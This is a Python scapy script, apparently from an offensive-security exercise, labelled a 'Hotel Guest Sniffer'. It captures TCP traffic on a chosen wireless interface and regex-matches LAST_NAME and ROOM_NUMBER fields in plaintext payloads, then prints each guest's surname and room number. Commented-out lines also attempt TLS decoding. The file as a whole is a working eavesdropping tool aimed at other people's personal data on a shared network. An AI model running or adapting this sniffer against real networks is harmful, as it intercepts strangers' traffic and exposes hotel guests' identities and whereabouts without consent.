#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import *
from scapy.utils import PcapReader


def findGuest(pkt):
    raw = pkt.sprintf('%Raw.load%')
    # p = pkt[0]
    # print(bytes(p[TCP].payload))
    # print(bytes_hex(raw))
    # print(pkt)
    # load_layer('tls')
    # print(type(raw))
    name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)", raw)
    # print(raw)
    # if raw != '??':
    #     raw = TLS(bytes(raw, "utf8"))
    #
    #     # print(raw)
    #     name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    #     room = re.findall("(?i)ROOM_NUMBER=(.*)", raw)
    # try:
    #     print(TLS(bytes(raw, "utf8")),raw, name, room)
    # except:
    #     print(raw)
    if name:
        print('[+] Found Hotel Guest ' + str(name[0])+', Room #' + str(room[0]))


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-i <interface>')
    parser.add_option('-i', dest='interface',\
       type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        conf.iface = 'MERCURY Wireless N Adapter'
        print(parser.usage)
        # exit(0)
    else:
        conf.iface = options.interface

    try:
        print('[*] Starting Hotel Guest Sniffer.')
        sniff(filter='tcp', prn=findGuest, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
